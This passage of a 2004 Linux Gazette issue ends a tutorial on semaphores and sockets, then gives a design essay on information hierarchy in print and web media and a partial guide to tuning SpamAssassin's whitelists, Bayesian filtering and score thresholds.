enables the scheduling of the two process to provide enough time slices to
both the process. Confusing, right? Try running the code without that
sleep; the results are educational.</cite>

<p> The <strong>critical_resource</strong> simply reads keyboard characters
other than '\n' and when a digit between 0 and 9 is read, it asks the user
to raise the keyboard interrupt. 

<p> This may look as simple as the concept explained in almost all
textbooks on Operating Systems.  But this is because we are dealing with
only one member in the semaphore set. The complexity increases as the
number of semaphores increases. One may also wonder, why not use a simple
flag kept in shared memory instead? That would be fine if we were dealing
with programs as simple as the one given as example here, but would
restrict the usage and features that are available with semaphores.  I
suggest experimenting with this mechanism, with more complex programs where
you deal with more than just one semaphore in the set. 


<h3>Sockets</h3>
Sockets are the most popular of all the IPC mechanisms for a simple reason:
other mechanisms do not support communication between two machines. Sockets
provide a full-duplex communication channel between processes that do not
necessarily run on the same machine.

<p>
Generally, sockets are associated with the concept of network communication
in the form of client-server programming; a pair of processes of which one
will be a client and one a server. The client process will send requests to
the server, and the server process will send replies as an acknowledgment
to the client requests.  Of course, when creating a socket, we have to
specify the type of communication that will be needed, since different
modes of communication requires different protocols.

<p>
The different system calls associated with this form of IPC mechanism are given below:

<ol type=a>
<li>socket: This system call returns the descriptor, which is
used for further communication. The format is 
<pre>
int socket(int domain, int type, int protocol);
</pre>
The first argument <strong>domain</strong> specifies the communication
domain. The domain here indicates which protocol family is to be used for
communication and the third argument <strong>protocol</strong> specifies a
particular protocol to be used with the socket. See the manual page for
<strong>socket</strong> for more details on the protocols supported. The
second argument <strong>type</strong> specifies the properties, features or
limitations of the socket.
<li>bind: This binds the socket with a name. The format is 
<pre>
int bind(int sockfd, struct sockaddr *my_addr, socklen_t addrlen);
</pre>
Here, the address <strong>my_addr</strong> of length
<strong>addrlen</strong> is given to the socket whose descriptor is
<strong>sockfd</strong>. The address is initialized before a call to
<strong>bind</strong> is made.
<li>listen: listen for connections on a socket. The format is 
<pre>
int listen(int s, int backlog);
</pre>
This tells the kernel to queue up a maximum of <strong>backlog</strong>
number of connections for the socket with the descriptor
<strong>s</strong>. If the queue becomes full, then appropriate action is
taken based on the protocol being used.
</pre>
<li>accept: accept the connection on a socket. The format is 
<pre>
int accept(int s, struct sockaddr *addr, socklen_t *addrlen);
</pre>
This accepts connections and fills up the <strong>addr</strong> with the
socket address of the client. Sockets support connection-oriented as well
as connectionless communication. This system call is associated only with
connection-oriented communication. 
<br>
<cite>For more details on connection-oriented and connectionless
communication, please refer the book <strong>Computer Networks</strong> by
<strong>Andrew S Tanenbaum</strong>.</cite>
<li>connect: initiate a connection in a socket. The format is 
<pre>
int  connect(int  sockfd,  const  struct sockaddr *serv_addr, socklen_t addrlen);
</pre>
This is invoked by the client to connect to a socket with descriptor
<strong>sockfd</strong> on a server with the address
<strong>serv_addr</strong>. Once <strong>connect</strong> call succeeds, it
returns zero, otherwise <em>errno</em> is set appropriately.
</ol>

(See <a href="misc/ramankutty/client.c.txt">client.c.txt</a> and <a href="misc/ramankutty/server.c.txt">server.c.txt</a>)

<p>
The structure of the two programs <strong>client.c</strong> and
<strong>server.c</strong> are similar; both programs initially create
sockets. The sockets are created using the <strong>AF_INET</strong> family
of protocols, which is same as <strong>PF_INET</strong>. The field
<strong>SOCK_STREAM</strong> indicates that it will be a sequenced,
reliable, full-duplex and connection-based socket. The protocol specified
during creation of socket is '0'. This can also be 
<strong>IPPROTO_TCP</strong> for tcp sockets and
<strong>IPPROTO_UDP</strong> for udp sockets.

<p>
In the case of the server, we name the sockets using the
<strong>bind</strong> system call. We have a structure
<strong>sockaddr</strong> and <strong>sockaddr_in</strong>. The former
specifies the generic socket address, whereas the latter describes the
internet socket address. The structure as one can see in the manual page
for <strong>ip</strong> is 
<pre>
struct sockaddr_in {
	sa_family_t    sin_family; /* address family: AF_INET */
	u_int16_t      sin_port;   /* port in network byte order */
	struct in_addr  sin_addr;  /* internet address */
}
</pre>
and <strong>in_addr</strong> is 
<pre>
struct in_addr {
	u_int32_t s_addr;	/* address in network byte order */
}
</pre>

<p>
Here, the <strong>sin_family</strong> field is same as the family of
protocols being used, that is, <strong>AF_INET</strong>. The
<strong>sin_port</strong> field is the port number (in network byte order),
which will be used by the socket. Finally, <strong>sin_addr</strong> field
is the internet address (again in network byte order), which here I have
given as the loopback address. The socket is bound to these details, once
a successful call is made on <strong>bind</strong>.

<p>
The <strong>listen</strong> system call specifies that the created socket
is willing to accept incoming connections, but with a restriction that
there will be a limitation for the number of connections.  In our code, the
limitation is given as '1', which specifies the queue size for the number
of pending connections.

<p> An <strong>accept</strong> call returns the descriptor of the accepted
connection. If the server needs to serve n &gt; 1 number of connections,
then we have to make repeated calls to <strong>accept</strong>.

<p>
After that, we can do the usual file operations (e.g.,
<strong>read</strong> and <strong>write</strong>) on the descriptor
returned by the <strong>accept</strong> system call. Alternate
<strong>read</strong> and <strong>write</strong> operations will 
help the server to communicate with the client.

<p> Coming to the structure of the client program, once a socket is
created, the client tries to connect to the server using the
<strong>connect</strong> system call. This, again, is done after setting
the internet socket address before binding the socket to a name.  Once the
call to <strong>connect</strong> is successful, the client program can
start communicating with the server. 

<cite>Note: obviously, the client program can only connect to a running
server. However, for testing purposes, please run the client program
without running the server.</cite>

<p> The example shown here illustrates the use of sockets for loopback
communication. The client and server programs may be run on different
machines by changing the internet address to the required ones. There are
also several other families of protocols which support communication via
sockets. Some of the interesting ones are <strong>PF_LOCAL</strong> for
local communication, <strong>PF_PACKET</strong> for low-level packet
interface, <strong>PF_NETLINK</strong> for communication between the kernel
and the user, etc. It's a good idea to try out these options to
understand the flexibility and domains (in the application level) where one
can use this mechanism. The example above is for connection
oriented communication. Exploring the use of sockets in an
connectionless-oriented communication is left as an exercise to the
readers.

<h3>Conclusion</h3>
<p> Finally, I come to an end of my article. I have tried to present the
concepts of Inter-Process Communication in a manner which will make it
easier for novice programmers to write their own code whenever they come
across any of the problems that I have mentioned here.  This two-part
article will not, of course, make you an expert in this field, but should
form a good base for future exploration.


</p>



<!-- *** BEGIN author bio *** -->
	<!-- *** BEGIN bio *** -->
<hr>
<P>
<img ALIGN="LEFT" ALT="[BIO]" SRC="../gx/authors/ramankutty.jpg" width="200" height="200" class="bio">
<em>

I completed my B. Tech in Computer Science &amp; Engineering from a small town
called Trichur, in Kerala, God's Own Country in India. Presently I am
working in Naturesoft Pvt. Ltd, Chennai, India as a Programmer. I spend my
free time reading books on Linux and exploring the same. Also, I have a
good appetite for Physics. My motive in life is to go forward, onward and
upward.

</em>
<br CLEAR="all">
<!-- *** END bio *** -->

<!-- *** END author bio *** -->




<div id="articlefooter">



<p>
Copyright &copy; 2004, <A HREF="../authors/ramankutty.html">Hiran Ramankutty</A>. Released under the
<a href="http://linuxgazette.net/copying.html">Open Publication license</a>
unless otherwise noted in the body of the article. Linux Gazette is not
produced, sponsored, or endorsed by its prior host, SSC, Inc.
</p>



<p>
Published in Issue 105 of Linux Gazette, August 2004
</p>

</div>

</div>


<div class="content lgcontent">

<a name="seymour"></a>
<h1>Design Awareness</h1>
<p id="by"><b>By <A HREF="../authors/seymour.html">Mark Seymour</A></b></p>


</b>
</p>


<p>
<h3>Paradigms are much more than twenty cents</h3>

<p class="editorial"> (See the <a href="../authors/seymour.html">author's bio</a> for the  
preceding articles in this series.)

<p> Now that you've gathered your text and images, identified your files,  
and gotten your approvals and translations, you're ready to add  
structure to your data. To communicate effectively, you must create a  
hierarchy for your data, because our brains try to make order out of  
disorder instinctively.

<p> Early examples are star constellations, where prehistoric humans turned
the jumble of stars in the night sky into the Bear and Orion's Belt and  86
other named patterns (see  <a
href="http://www.astro.wisc.edu/~dolan/constellations/constellation_list.html">http://www.astro.wisc.edu/~dolan/constellations/constellation_list.html</a>
for a complete list), and playing cards, the first decks of which date
back to 14th century Italy. (For the history of playing cards, check  out
this British site, <a href="http://wopc.co.uk">http://wopc.co.uk</a>, or
this French museum,  <a
href="http://www.issy.com/statiques/musee/index.html">http://www.issy.com/statiques/musee/index.html</a>.)
Related to the Tarot  decks, but without their spiritual context, playing
cards are a very  dense informational unit. Sortable by suit and color and
numeric  position, these 56 ordered objects are used every day by people
who  speak no common language and have no hereditary aristocracy; it is
hard  to imagine another equally successful information system: <br><img
src="misc/seymour/cards.png">

<p> As a design challenge, try creating your own 'found' deck of cards (see  
<a href="http://www.communigate.co.uk/hants/playingcards/page4.phtml">http://www.communigate.co.uk/hants/playingcards/page4.phtml</a> for more on  
the concept) or check out the latest 'high-tech' deck at  
<a href="http://www.zbyte.com">http://www.zbyte.com</a>.

<p> In the five and a half centuries since Gutenberg (see  
<a href="http://www.gutenberg.de">http://www.gutenberg.de</a> and <a href="http://www.dotprint.com/fgen/history1.htm)">http://www.dotprint.com/fgen/history1.htm)</a>,  
several major information paradigms have been created: the book, the  
newspaper, the magazine, and the catalog. Each has its own distinct  
method of presenting information, giving each a traditional, and  
expected, graphical look. Each serves a particular niche in the  
information system; as Umberto Eco noted, "Egyptians could carve their  
records on stone obelisks, Moses could not." (For his complete 1996  
speech, <em>From Internet to Gutenberg</em>, see  
<a href="http://www.italianacademy.columbia.edu/pdfs/lectures/eco_internet_gutenberg.pdf">http://www.italianacademy.columbia.edu/pdfs/lectures/eco_internet_gutenberg.pdf</a>.)

<p> Most web sites emulate, with varying success, one or more of these four  
paradigms.

<p> Books have traditionally been the boring, stuffy cousins of the  
information family. Many now wear splashy full-color dust jackets or  
soft covers, looking more like a poster than a traditional  
leather-bound book: <br><img src="misc/seymour/tov.png">

<p> But their full-color covers are still wrapped around text-only guts,  
and almost all books still bear the half-title page, title page,  
copyright page, contents page, body-of-text organizational scheme  
developed hundreds of years ago. Most are set in one or two fonts, with  
little graphical distinction except on the chapter opening pages, and  
many still carry a quaint notion, the colophon, at the back, where the  
designer mentions the font used, often with the history of the font  
itself. The information in most books is very linear, yet the table of  
contents or the index (found in most non-fiction books), like the  
navigation bar or the search box in a website, allow you to quickly  
find a section of interest or a particular reference.

<p> Books published on-line or as downloadable files have generally  
retained this 'antique' look (see <a href="http://www.ebookmall.com/index.html">http://www.ebookmall.com/index.html</a>  
for examples), and there are many sites that provide free versions,  
especially of older texts: <a href="http://www.perseus.tufts.edu/">Project
Perseus</a> and <a
href="http://www.gutenberg.net/">Project Gutenberg</a>.
 Because books are  
often published off-line first, their on-line equivalents are forced to  
mimic the hard copy versions; unfortunately, the long-awaited  
"hypertext revolution" has yet to arrive.

<p> Newspapers have always been a 'cool' medium. Here are pairs of London
(1797 &amp; 1940) and New York (1863 &amp; 1945) newspapers, produced 143
and 82 years apart:
<p>
<table align="center">
<tr>
<td width="40%" align="left"><img src="misc/seymour/london1797.png">
<img src="misc/seymour/london1940.png"></td>
<td width="40%" align="right"><img src="misc/seymour/newyork1863.png">
<img src="misc/seymour/newyork1945.png"></td>
</tr>
</table> 

With the exception of the larger headlines (made necessary by a change  
in selling tactics from hawkers to racks), there's little to  
distinguish one era from another. While newspapers have adopted colored  
inks and color photography, within the limits of their paper stock,  
even the <em>New York Times</em> still looks much the same today, 141  
years after the Civil War issue above:

<table align="center">
<tr>
<td width="35%" align="center"><img
src="misc/seymour/nytfrontpage.png"></td>
<td><img src="misc/seymour/nytbanner.png"></td>
</tr>
</table> 

<p> Even on-line, the <em>Times</em> adopts the familiar multi-column layout:
<a href="http://www.nytimes.com/">http://www.nytimes.com/</a>, and still
looks like a newspaper. Note that  the paper continues to use an 'Old
English'-style (based on the German  black letter fonts) font for its
nameplate.

<p> This has been a traditional font for newspaper names around the world  
for over 150 years, though the <em>Times</em> of London had Stanley  
Morrison design its own eponymous font (Times New Roman, of course) in  
1931. (For a good overview of how the same font can be made subtly  
different, depending on the type foundry that produces it, see  
<a href="http://www.myfonts.com/fonts/linotype/times-roman/familytree.htm">http://www.myfonts.com/fonts/linotype/times-roman/familytree.htm</a>.)

<p> Magazines, of course, have always been a 'hotter' medium. They began  
utilizing illustrations over text early on and, beginning in the 1940s,  
<em>Life</em> and <em>Look</em> made photography their primary information  
tool, often reducing the text to mere captions. Where early designs,  
like the 1944 'General Montgomery' issue of the <em>New York Times  
Magazine</em>, used photography alone, current magazine covers carry  
enough text references to articles inside, just as websites display  
prominent links to subpages, to qualify as tables of contents  
themselves, and often nearly obscure the underlying photo: 

<p> <img  src="misc/seymour/newyork1944.png">
<img src="misc/seymour/vanityfair.png">

<p> Catalogs are mailed out by the truckload (12.8 billion each year,  
averaging 1.7 catalogs per home per week, according to <em>Fast  
Company</em>), and exist on-line for nearly every product. Sears,  
Roebuck was one of the first mass catalogs, beginning in 1888; see  
<a href="http://www.bgsu.edu/departments/acs/1890s/sears/sears4.html">http://www.bgsu.edu/departments/acs/1890s/sears/sears4.html</a> for period  
details. More recently, the famed J. Peterman catalog (the real one,  
not the character from the Seinfeld show) was a high-art version of the  
paradigm, using hand-drawn illustrations and florid prose to describe  
the products. Recently reborn, its on-line version,  
<a href="http://www.jpeterman.com/default.htm">http://www.jpeterman.com/default.htm</a>, mimics the flavor of the print  
version almost perfectly. More commonly, catalogs use massive numbers  
of product photos, often shown in elaborate environments, to promote  
their wares, and their on-line versions usually match (see  
<a href="http://www.ikea-usa.com/">http://www.ikea-usa.com/</a> to compare): 
<br><img src="misc/seymour/ikea.png">

<p> Each of these paradigms, book or newspaper or magazine or catalog, has  
its own manner of hierarchy, and readers expect them to follow the  
norms for the category; a book that's formatted like a catalog might be  
intriguing but, unless its content is of very high value, readers will  
give it only a cursory look. When creating complex and multi-purposed  
information sets, like an annual report or a university catalog or a  
website, however, you have more flexibility; different sections of the  
piece can have very different purposes and require a different data  
structure and, often, a very different design structure.

<p> As noted earlier, there are on-line equivalents of existing  
hierarchical structures: navigation bars are similar to tables of  
contents, and search boxes are automated indices. The magazine cover  
model is used in websites every day, with the added advantage of image  
animation: <a href="http://www.kohler.com">http://www.kohler.com</a> and <a
href="http://www.luerssen.de/frame.html">http://www.luerssen.de/frame.html</a>
are good examples.


<h3>Putting It All Together</h3>
<p> So, how do we create hierarchy? You need to determine a design matrix  
or grid, where items of similar importance or shared relevance  
(headlines at the same 'level', standard text information, charts and  
graphs, photograph captions, etc.) are formatted using the same (or a  
markedly similar) style. Style, of course, consists of all the visual  
characteristics of text (font, font weight, font style, and/or font  
color) plus a number of traditional markers that indicate hierarchy.
These markers, for users of Western European languages, are pretty much  
the same: front, top, left, and size. That means that an object,  
whether it's text or a photo or an icon, that sits in front of another  
(think every web popup you see), or above another, or to the left of  
another, or is bigger than another, is more important. Similarly,  
something that is in a bolder font, or a stronger (not necessarily  
brighter) color, is more important; think of a red headline in  
<strong>bold</strong> versus a black one in a regular weight font. (Italics can  
sometimes raise something in importance, and sometimes diminish it, so  
be careful when using it or anything else from the Font Style menu in  
your design application.)

<p> If you check the front pages of the newspapers above, you'll see they  
all correspond to this system. Web-based materials should obey the same  
structure, with the addition of 'first' or 'early' in the case of  
animations and movies. (Note that I do not include the use of ALL CAPS  
in the emphasis variants; the style has lingered over-long in newspaper  
headlines, and should be used sparingly, if at all. Text is far less  
readable in all capitals, as shown <a  
href="misc/seymour/gettysburg.txt">here</a>, and 'screams' at the  
reader; it should be considered as impolite to use it in print or  
on-line as it is in emails.)

<p> Deciding <strong>what is important</strong> is, oddly enough, the most
important thing you can do. While that pretty photograph you  commissioned,
or the luscious chart you slaved over for hours, might  <strong>seem</strong>
important, is it important to your viewer? After they understand what your
piece is about (are you providing a history of your city, selling a better
mousetrap, or giving directions to the nearest hospital? Never assume that
the reader already <em>knows</em>), having a clear method of finding specific
information in your piece, whether a  thorough table of contents or site
map or index, is often what viewers  hope for and rarely find.

<p> Now slice and dice your carefully prepared data. Determine if a linear  
or some other information flow is appropriate to your material; working  
on-line, of course, lends itself to 'spider' or cross-linked  
information much more than a printed piece. Arrange each section and  
subsection using your chosen pattern, and decide what visual method  
you'll use to both connect them and distinguish them; that becomes your  
design matrix.

<p> Once you've determined the design matrix, meaning that you've set the  
size, font, and color for a headline or body text or a chart caption or  
a footnote along with all the other data types in your files, along  
with the proportional size for photographs and illustrations, you can  
easily apply it to your data. Don't, of course, be rigid in your use of  
the matrix; some things <strong>need</strong> to be in a different font, or a  
different color, to set off their own importance. A change in data type  
(from text to charts and graphs, for instance; the annual report is a  
classic example) may force a change (layout, font structure, or color  
system) to a particular section; consistency can be the hobgoblin of  
design, as well. But changing <strong>everything</strong>, just for the sake of  
change, only leads to dizziness. While it can be visually tempting,  
changing the data structure or the fonts or even just the system of  
color usage, whether on every page or from section to section, can  
confuse and often infuriate the reader. While a pissed-off user who's  
already purchased your book or magazine might just never buy another  
one, the frustrated customer holding your expensively printed and  
mailed catalog or viewing your expensively designed web page will  
merely throw it away or click to another site, and all your investment  
of time and money in its production is instantly wasted.

<p> Choose your fonts and color systems carefully.  Sure, you <em>can</em>
set a headline in 144 point Frutiger Bold Italic Outline in <font
color="#FF9900">#FF9900 orange</font>, and the text beneath it in 6 point
Helvetica Narrow Underlined in <font color="#FF0000">#FF0000 red</font>,
all on a background of <font color="#009900">#009900 green</font>, but do
you <em>have</em> to?  Use colors that don't fight each other, and keep the
choices of colors, fonts, font sizes, and font weights to a minimum.  Two
fonts, one headline and one text, used in three font sizes each  with,
sparingly, bold and italics for each, gives you a lot of  variations.
Picking a small and delicate color palette (see <a
href="http://www.visibone.com/color/">http://www.visibone.com/color/</a>,
<a
href="http://www.websitetips.com/color/">http://www.websitetips.com/color/</a>,
and <a
href="http://www.webcolors.freeserve.co.uk/">http://www.webcolors.freeserve.co.uk/</a>
for good web color systems) will keep the reader from going blind or
gagging. Of course, there  are situations (a good thrash site, for
instance; see <a
href="http://punkrockskateboards.com/stage_dive.htm">http://punkrockskateboards.com/stage_dive.htm</a>
or <a href="http://www.tenfootpole.com/">http://www.tenfootpole.com/</a>)
where anything goes, and the reader will welcome the best, or at least the
weirdest, you can offer.

<p> Now that you've applied your hierarchy system to the design of each  
section, make sure you step back (literally, if necessary) and see if  
the overall system is working. It is too easy to get caught up in  
manipulating the little bits (captions, headlines, footnotes, headers  
and footers, etc.) and not notice the glaring failure of the whole  
piece to provide a clear and understandable flow of information to the  
reader.

<h3>The Closing Note</h3>
<p> Creating hierarchy can be as simple (using ever-smaller font sizes) or  
as complex (using cross-linking and color systems and font families and  
animated buttons) as you want. But not doing it thoughtfully, or  
consistently, can be as if you never did it at all. Providing the  
reader with an elegant, easy-to-use system of determining importance  
and navigating information is a solution worth the effort.


</p>



<!-- *** BEGIN author bio *** -->
	<!-- *** BEGIN bio *** -->
<hr>
<p>
<img align="left" alt="[BIO]" src="../gx/authors/seymour.jpg" width="200" height="200" class="bio">

<em>
<p> I started doing graphic design in junior high school, when it was still
the Dark Ages of technology. Bill Gates and Steve Jobs were both eleven
years old, and the state of the art was typing copy on Gestetner masters.
I've worked on every new technology since, but I still own an X-acto knife
and know how to use it.

<p> I've been a freelancer, and worked in advertising agencies, printing
companies, publishing houses, and marketing organizations in major
corporations. I also did a dozen years [1985-1997] at Apple Computer; my
first Macintosh was a Lisa with an astounding 1MB of memory, and my current
one is a Cube with a flat screen.

<p> I've had a website up since 1997, and created my latest one in 2004. I'm
still, painfully, learning how web design is different from, but not
necessarily better than, print.

</em>
<br clear="all">
<!-- *** END bio *** -->


<!-- *** END author bio *** -->




<div id="articlefooter">



<p>
Copyright &copy; 2004, <A HREF="../authors/seymour.html">Mark Seymour</A>. Released under the
<a href="http://linuxgazette.net/copying.html">Open Publication license</a>
unless otherwise noted in the body of the article. Linux Gazette is not
produced, sponsored, or endorsed by its prior host, SSC, Inc.
</p>



<p>
Published in Issue 105 of Linux Gazette, August 2004
</p>

</div>

</div>


<div class="content lgcontent">

<a name="youngman"></a>
<h1>Fine-tuning SpamAssassin</h1>
<p id="by"><b>By <A HREF="../authors/youngman.html">Neil Youngman</A></b></p>


</b>
</p>


<p>
<p>
SpamAssassin, as most of our readers will know, is a popular spam
classifier on Linux. This article assumes that you already have
SpamAssassin installed and working. If you are interested in running
SpamAssassin, but do not yet have it set up, there is a useful introduction at
<a href="http://linux.org.mt/article/killspam">http://linux.org.mt/article/killspam</a>.

<p>
When I set up SpamAssassin in Mandrake 9.2, it came very close to picking
up 100% of my spam. Over time, however, many of the spammers have figured
out how to fine tune their spam and bypass the default ruleset. I find the
default setup still picks up at least half the spam, maybe two thirds on a
good day, but too much leaks through.  If the spammers are tuning their
messages, I guess the only thing to do is to tune my scoring. There are at
least 8 possible ways of improving SpamAssassin's hit rate.

<ol>
  <li>Blacklisting known offenders</li>
  <li>DNS Blocklists</li>
  <li>Enable Bayesian filtering</li>
  <li>Reduce the point threshold for spam</li>
  <li>Increase the scores on existing rulesets</li>
  <li>Upgrade SpamAssassin to the latest version</li>
  <li>Install more rulesets</li>
  <li>Write your own rulesets</li>
</ol>

<h3>Configuring SpamAssassin</h3>
Fine-tuning SpamAssassin is, of course, done by editing the appropriate
configuration file. If the changes are just for your account, then you edit
~/.spamassassin/user_prefs. If you are making global changes, they go in
/etc/mail/spamassassin/local.cf (and require root access.) I strongly
recommend testing changes in your local configuration before changing the global
configuration.

<p>
The options available in your configuration file are listed in <a
 href="http://spamassassin.org/doc/Mail_SpamAssassin_Conf.html">
http://spamassassin.org/doc/Mail_SpamAssassin_Conf.html</a>, as well as in
the relevant manpage (see "man Mail::SpamAssassin::Conf".)

<h3>SpamAssassin's Scoring Mechanism</h3>
In principle, SpamAssassin's scoring mechanism is simple. There are a
set of rules for identifying spam, scores associated with those rules,
and an overall threshold score. If the total score for all the rules
triggered by a message reaches the threshold, that message is marked as
spam.

<p>
Most of the complexity is in the rules, but it's rarely necessary to
roll your own SpamAssassin rules. Adjusting the threshold and the
scores associated with existing rules is much simpler and can be very
effective. If that's not enough, there are also additional
rulesets available to download. Of course, if you think writing you
own rulesets sounds like a fun thing to do, I've included a pointer
<a href="#rules">below</a> to get you started.

<p>
Most of the rules are listed in <a
href="http://spamassassin.org/tests.html">http://spamassassin.org/tests.html</a> 
along with their associated scores, but the scores listed did not match those in
my configuration files. They were probably from a newer release. You
will probably find the default scores for your configuration in
/usr/share/spamassassin/50_scores.cf, where there are 4 scores
associated with each rule. The rule chosen depends on whether Bayesian
analysis (see below) and network tests are enabled. Where only one
score is supplied, that score is always used. Other options, such as
relative scores, are described in the aforementioned documentation.

<h3>False positives, whitelisting, and blacklisting</h3>
No spam filter gets it right all the time, and there are 2 types of
errors. False negatives are bad, because that means a spam was missed
and allowed to slip through the net. False positives, however, are worse,
because you may miss something you should have seen, which has been
tagged as spam. No spam filter should ever be configured to automatically
delete email without human review. Spam should always be dropped into a
quarantine area, which should be reviewed at frequent intervals to ensure
that genuine emails aren't missed.

<p>
Regular reviews are even more important as you tune your settings. No
matter how careful you are, there is no guarantee that any change to the
settings won't cause some collateral damage.  Even with the default setup,
you will see some false positives, e.g. newsletters from <a
href="http://www.nationaltrust.org.uk/">The National Trust</a> and <a
href="http://www.roh.org.uk">The Royal Opera House</a> get marked as spam,
so a key part of managing your spam - especially in the beginning -
involves reviewing the hits and determine which senders you need to
"whitelist".

<p>
Whitelisting is usually done with the settings <code>whitelist_from</code> and
<code>whitelist_to</code>. These can be repeated as many times as you like. Simple
<em>globbing</em> patterns (see "man bash" and search for "Pattern
Matching" for a description) are used to specify wildcard matches. E.g.,
'?' matches a single character and '*' matches any number of characters
(including zero.) <code>whitelist_from</code> and <code>whitelist_to</code>
subtract 100 points from the score, making it very rare for matching emails
to reach the spam threshold.

<pre>
whitelist_from nice.but_clueless@example.net
whitelist_from *@importantclient.example.com
</pre>

Also available are options <code>more_spam_to</code>,
<code>all_spam_to</code>. According to the documentation, &quot;There are
three levels of To-whitelisting, <code>whitelist_to, more_spam_to and
all_spam_to</code>. Users in the first level may still get some spammish
mails blocked, but users in<code>all_spam_to</code> should never get mail
blocked.&quot;

<p>
You should consider using <code>all_spam_to</code> for postmaster
addresses. It's very annoying if someone tries to report a spam and has
their report blocked or rejected as spam.

<p>
You may sometimes see a large number of emails slipping through from a
particular sender. Usually sender IDs are forged and chosen
randomly. There is little point blacklisting most senders, but sometimes it
can be worthwhile. A more useful option is blacklisting based on
recipients. If your email address is a.white@example.com you may see a
lot of spam with nearby addresses, such as a.wharton@example.com and
a.winter@example.com in the cc list and these recipients can be
blacklisted. 

<p>
According to the documentation blacklisting is done with the settings
<code>blacklist_from</code> and <code>blacklist_to</code>, but you may find
that<code>blacklist_to</code> doesn't work on versions of SpamAssassin
older than 2.6.0.

<pre>
blacklist_from *@evilspammers.example.org
blacklist_to a.wharton@example.com
blacklist_to *.wi*@example.com
</pre>

There are a number of other settings for blacklisting and whitelisting.
Global settings can be overridden locally by <code>unwhitelist_from,
unwhitelist_to, unblacklist_from</code> and <code>unblacklist_to</code>.
Please read the documentation to find out more about these and other
available settings.

<h3>DNS Blocklists</h3>
DNS Blocklists are another form of blacklisting. They are externally
maintained lists of mail servers which have been identified as sources
of spam or open relays. These are sometimes referred to as RBLs
(Realtime Blackhole Lists).

<p>
SpamAssassin checks the headers to see if the email has been relayed
through any hosts with matches in certain blocklists. This is known
not to work with a number of configurations because it only checks the
first DNS entry in resolv.conf; if this does not point to a working
DNS server, it will not work. This is a known problem under Mandrake
9.2.

<p>
DNS Blocklists can be disabled with the option skip_rbl_checks.


<h3>Enable Bayesian filtering</h3>
Bayesian analysis is a statistical technique in which the frequency of
words in emails are analysed, according to how often they appear in
spam and how often they appear in other emails. The content of
incoming emails is then analysed to assign a probability of the email
being spam.

<p>
Bayesian analysis is a feature of recent versions of SpamAssassin and
I find it very effective. Some work is required to build and maintain
the database, but it is well worth the small effort involved.

<p>
To configure SpamAssassin to use Bayesian analysis you add the line

<pre>
use_bayes	1
</pre>
to your user_prefs file.

<p>
You won't see any matches for Bayesian analysis yet. The algorithm
requires at least 200 spam emails in it's database before it will
assign any probability to your emails. To get to this point collect
your spam emails in a separate mailbox and run

<pre>
sa-learn --spam --mbox ~/Mail/spamtrap 
</pre>

Often you will see that the number of emails it has learned from
(analysed) is less than the number that appear to be in the mailbox it
is learning from. This is because it has detected that some emails are
duplicates of emails it has seen before.

<p>
You should also give it your "ham" emails to learn from using the command

<pre> 
 $ sa-learn --ham --mbox ~/Mail/inbox
</pre>

Once it has learned from more than 200 spam emails you should start
seeing matches in the headers like

<pre>
BAYES_90           (4.5 points)  BODY: Bayesian classifier says spam probability is 90 to 99%
</pre>

Don't stop feeding it data when it starts to work. The more data it
has, the more accurate it should be. If you are short of disk space,
you should bear in mind that the database can get quite large. Mine is
about 10MB.

<p>
If at any time you accidentally classify a message incorrectly this
can be corrected. Move the message to a temporary folder, then use the
command

<pre>
sa-learn --forget --mbox ~/Mail/temp 
</pre>

then move it back to the correct folder and classify it as usual.


<h3>Reduce the points threshold for spam</h3>
The simplest approach to catching more spam is just to reduce the
points threshold. This can be quite effective. The default is to mark
a message as spam when it scores 5 points or more. Reducing this will
catch a lot more spam, but it will also increase the risk of false
positives.

<p>
In my experience a threshold of 3.0 or 3.5 will increase the amount of
spam caught dramatically, but won't produce significantly more false
positives. This is achieved very simply by changing or adding the
required_hits setting, e.g.

<pre>
required_hits	3.5
</pre>

If you have been using SpamAssassin for a while you can use grep to
assess the level at which you are likely to see a significant increase
in false positives. This is done by searching your mail folders for
X-Spam-Status header lines with different scores.

<pre>
$ grep 'X-Spam-Status: .* hits=[5-9]\.' ~/Mail/inbox | wc -l
      1
$ grep 'X-Spam-Status: .* hits=[34]\.' ~/Mail/inbox | wc -l
      4
$ grep 'X-Spam-Status: .* hits=2\.' ~/Mail/inbox | wc -l
     10
$
</pre>

The first command shows that there is only 1 mail in my inbox that has
scored between 5.0 and 9.9 points. The second that there are 4 mails
that scored between 3.0 and 4.9 points and the third that 10 mails
scored between 2.0 and 2.9 points. It should be borne in mind that
this ignores all emails from before setting up SpamAssassin and all
emails that you have deleted since that time.

<h3>Increase the scores on existing rulesets</h3>
After you've got Bayesian analysis working and you've decided on the
threshold that's appropriate for you, there will no doubt still be
some spam getting through. It's time to delve into the headers and
find out what rules need higher scores.

<p>
Before we start, I should say that the default scores have been tuned
using a <a href="http://wiki.apache.org/spamassassin/GeneticAlgorithm">genetic
algorithm</a>. Should you trust your judgment against that algorithm?
My opinion is that spam is evolving. Many of them are tested
against the default SpamAssassin rules and fine tuned until they
pass. Also everyone's spam problem is different. Statistically, what
works for a large database of spam, possibly going back years, isn't
necessarily the best for your current spam problem. If you find that
your tuning efforts make the problem worse, you can always go back to
the defaults.

<p>
Incoming messages should have some headers that indicate which rules
were triggered. These look like:

<pre>
X-Spam-Status: No, hits=3.0 required=3.5
	tests=BAYES_50,USER_AGENT
	version=2.55
</pre>

These headers will not normally be displayed, but any decent mail
client will have an option to display all headers. In kmail this
option is View-&gt;Headers-&gt;All.

<p>
If you do not see these headers when you have all headers displayed,
take a look at the section "Other Options" at the end of this article
for the option controlling headers.

<p>
Looking at the matches given above, Bayesian analysis has given the
mail a 50-60% probability of being spam. I have sufficient confidence in
the Bayesian analysis to make anything with a probability of 50% or
more spam, so I set the scores for those rules to my current
threshold of 3.5.   

<p>
Here's another one that sneaked in under the radar.

<pre>
X-Spam-Status: No, hits=1.6 required=3.5
        tests=HTML_20_30,MIME_HTML_ONLY,USER_AGENT
        version=2.55
</pre>

The USER_AGENT rule isn't very interesting. Most mail has a user-agent
header and this scores 0.001. We'll leave that alone. The other tests
seem to contradict each other, one apparently saying that that the
message is all HTML and the other that it's 20-30% HTML. I would guess
that the 20-30% is the ratio of HTML tags to text, so it can be all
HTML, but not all tags.

<p>
So, how should we adjust the scoring? HTML_20_30 matches 6 times in 8
months of legitimate email, but it matches a third of the mail
currently in my spam folder, so it should be scored highly, but not
highly enough to be conclusive on it's own. It seems to be scored at
1.47, which may be a bit low, but it's not far wrong. MIME_HTML_ONLY
matched 1 legitimate email, but matches 95% of my spam. Strangely this
